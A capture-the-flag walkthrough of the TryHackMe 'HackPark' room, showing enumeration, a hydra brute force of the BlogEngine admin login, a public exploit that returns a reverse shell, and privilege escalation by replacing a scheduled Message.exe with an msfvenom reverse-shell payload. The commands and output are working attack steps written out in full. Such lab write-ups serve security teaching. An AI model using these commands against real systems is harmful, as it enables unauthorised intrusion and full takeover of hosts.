# TryHackMe HackPark

> Author: Hades

> [*Scripting here*](https://github.com/leecybersec/scripting)

## VM Details

|**Name**|[HackPark](https://tryhackme.com/room/hackpark)|
|---|---|
|**Created by**|[tryhackme](https://tryhackme.com/p/tryhackme)|
|**Date release**| 614 days old (/4/2021)|

## Information Gathering

### Openning Services

```
### Port Scanning ############################
nmap -sS -Pn -p- --min-rate 1000 10.10.192.95
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

[+] Openning ports: 80,3389

### Services Enumeration ############################
nmap -sC -sV -Pn 10.10.192.95 -p80,3389
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 10:36 +07
Nmap scan report for 10.10.192.95
Host is up (0.23s latency).

PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2021-04-11T03:28:18
|_Not valid after:  2021-10-11T03:28:18
|_ssl-date: 2021-04-12T03:36:24+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.49 seconds
```

### Microsoft IIS httpd 8.5

```
### Web Enumeration (80) ############################

[+] Header
HTTP/1.1 200 OK
Cache-Control: private
Content-Length: 9415
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/8.5
Content-Style-Type: text/css
Content-Script-Type: text/javascript
X-Powered-By: ASP.NET
Date: Mon, 12 Apr 2021 03:32:51 GMT

[+] Files and directories
gobuster dir -k -u http://10.10.192.95:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
<snip>
/content              (Status: 301) [Size: 154] [--> http://10.10.192.95:80/content/]
/admin                (Status: 302) [Size: 172] [--> http://10.10.192.95/Account/login.aspx?ReturnURL=/admin]
<snip>
```

Search public exploit using `searchsploit`

```
┌──(Hades㉿10.11.32.198)-[4.9:27.3]~
└─$ searchsploit BlogEngine
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
BlogEngine 3.3 - 'syndication.axd' XML External Entity Injection        | xml/webapps/48422.txt
BlogEngine 3.3 - XML External Entity Injection                          | windows/webapps/46106.txt
<snip>
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution      | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Cod | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                 | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remot | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection              | aspx/webapps/47014.py
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

## Foothold

### Brute Force Admin

[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/tryhackme/hackpark)

Based on gobuster results, I go to `http://10.10.192.95/Account/login.aspx?ReturnURL=/admin` and brute force admin's credential password.

Some user may active in the system is `Administrator, Pennywise, Admin, Hackpark, Visitor1`.

```
┌──(Hades㉿10.11.32.198)-[5.6:28.3]~/walkthrough/tryhackme/hackpark
└─$ hydra -L users.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt 10.10.192.95 http-form-post '/Account/login.aspx:__VIEWSTATE=u%2Bg4t0W3qxAW3PECKLL0iq6XpDhzZWFzKEPQP2y16WH8I1gWd6wljTdOC0kamnXFmJNqhSqXe8Y93uvTfpuU%2FbGbnKb9ha%2FLtNNZvoxakyymix9j4okCpQcEYSsCGnkhWJkt02vqX3VMYKZXkVDs9GpfrfSAum8Gk9V%2FJzLsFU%2BFVNz0&__EVENTVALIDATION=XWG4XEGx3vkstzRKxm%2Bd2ATu0D%2FxXFsUyTNNDa8YIE94CqTjspwHvbfaptpY5i4BftorvtRQeMbUZLNF3bVofOToGAPwlbr6o1jhRwU5F6L1l%2FIqeELlNZuZDqoE%2Fv2Hn57xoQH3VNkmVM%2FSxdo3pGiowXAqdBNvGR7Do5fLMjuYP8GP&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed' -I -t 64
<snip>
[80][http-post-form] host: 10.10.192.95   login: Admin   password: 1qaz2wsx
<snip>
```

### RCE 'theme Cookie'

[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/tryhackme/hackpark)

With knowed credential and public exploit found, I used exploit `aspx/webapps/47011.py` and exeute it to get reverse shell.

```
┌──(Hades㉿10.11.32.198)-[1.6:41.6]~/walkthrough/tryhackme/hackpark
└─$ python 47011.py -t 10.10.128.40 -u admin -p 1qaz2wsx -l 10.11.32.198:443
```

At the listener, I have reverse shell

```
┌──(Hades㉿10.11.32.198)-[1.6:41.7]~
└─$ sudo nc -nvlp 443
listening on [any] 443 ...
connect to [10.11.32.198] from (UNKNOWN) [10.10.128.40] 49352
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```

## Privilege Escalation

### Local enumeration

Enum folder `Program Files` and `Program Files (x86)`. At folder `rogram Files (x86)`, I saw program SystemScheduler had been instaled.

```
c:\Program Files (x86)>powershell -c "dir | get-acl"
<snip>
SystemScheduler            BUILTIN\Administrators     Everyone Allow  Modify...
<snip>
```

Checking running service

```
c:\Program Files (x86)>powershell -c "get-service"
powershell -c "get-service"

Status   Name               DisplayName                           
------   ----               -----------                           
<snip>
Running  WindowsScheduler   System Scheduler Service              
<snip>
```

```
c:\Program Files (x86)>sc qc WindowsScheduler
sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

So far, folder SystemScheduler allow `Everyone modify` while service WindowsScheduler running as admin.

### Tasks File Overwrite

[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/tryhackme/hackpark)

Checking log to get overwrite file name.

At folder Events, I have file log for running service

```
c:\Program Files (x86)\SystemScheduler\Events>dir
<snip>
04/12/2021  12:21 AM             1,926 20198415519.INI
04/12/2021  12:21 AM            32,252 20198415519.INI_LOG.txt
<snip>
```

In log file, I know that SystemScheduler service run file Message.exe every single minute.

```
c:\Program Files (x86)\SystemScheduler\Events>type 20198415519.INI_LOG.txt
type 20198415519.INI_LOG.txt
08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
08/04/19 15:07:00,Event Started Ok, (Administrator)
08/04/19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator)
08/04/19 15:08:00,Event Started Ok, (Administrator)
08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)
08/04/19 15:09:00,Event Started Ok, (Administrator)
```

Let's create file reverse shell using msfvenom named Message.exe

```
┌──(Hades㉿10.11.32.198)-[1.5:41.0]~/walkthrough/tryhackme/hackpark
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.32.198 LPORT=443 -f exe -o Message.exe
```

Upload this file to `SystemScheduler` folder and wait for reverse shell.

```
c:\Program Files (x86)\SystemScheduler>dir
<snip>
04/12/2021  12:03 AM            73,802 Message.exe
03/25/2018  10:58 AM           536,992 Message.exe.1
```

At the listener, I have system shell

```
┌──(Hades㉿10.11.32.198)-[1.5:41.1]~/walkthrough/tryhackme/hackpark
└─$ sudo nc -nvlp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.11.32.198] from (UNKNOWN) [10.10.128.40] 49403
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\PROGRA~2\SYSTEM~1>cd c:\
cd c:\
c:\>whoami
whoami
hackpark\administrator
```